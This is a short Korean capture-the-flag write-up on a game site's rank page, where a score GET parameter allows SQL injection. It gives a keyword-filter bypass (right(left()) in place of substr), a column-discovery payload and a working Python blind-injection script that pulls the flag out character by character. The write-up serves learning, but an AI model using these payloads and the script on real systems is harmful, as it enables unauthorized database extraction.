# 문제

- 게임이 가능한 메인페이지와
- 마우스 움직이면 점수 올라감
  - 게임오버도 됨
  - 게임오버시 insert를 위한 request 전송
  - 중요하진 않다.
- rank 페이지가 있다.
  - get 인자로 score를 넘겨줘서, 이 값을 수정하여 원하는 스코어의 플레이어 정보 얻을 수 있음.
    - sql인젝션 가능
  - insert 될 때 어떤 값이 insert되는지 나와있음
    - id, score, flag
    - flag값을 알아내는것이 목표

#  풀이

- 가능한 키워드 들을 뽑아낸다.

  - 안되는게 별로 없어서 안되는걸 뽑아낸다.
    - `select`
    - `substr`
    - `single/double quota`

- 블라인드 인젝션을 시도하여 플래그값을 얻어내자

  - flag가 담긴 속성의 이름을 확인

    - `limit 2,1 procedure analyse()`

  - 알아낸 속성값을 비교루틴으로 플래그값 확인

    - `or right(left(password_column,1),1)=0x40...`

  - 전체 코드 in python

    ```python
    keys = 'abcdefghijklnmopqrstuvxyzABCDEFGHIJKLNMOPQRSTUVXYZ1234567890!@#*$^&()-[]{}=+_?'
    
    
    flags = ''
    flag_find = 0
    while True:
        for x in keys:
            param = '1 or right(left(p4ssw0rd_1123581321, {0}), 1)={1}'.format(len(flags)+1, hex(ord(x)))
            print param
            res = requests.get(url+page+param, cookies=cookies)
            if res.text.find('id : her0gyu') != -1:
                print 'founded...'
                print 'char: ' + x
                flags += x
                print 'flags: ' + flags
                flag_find = 1
                break
                
        if len(flags) == 31: #위의 쿼리에서는 left가 사용되어서 길이를 초과하면 루프를 빠져나가도록 해줘야 한다.
            break
        if flag_find == 0:
            break
    
    print '-----------------'
    print '-----------------'
    print '-----------------'
print 'founded flags successfully'
    print 'flags: ' + flags
    ```
    
    

# 알게된 것

### substr 우회

- `right(left(컬럼명, 1), 1)`
- 아주 유용하구만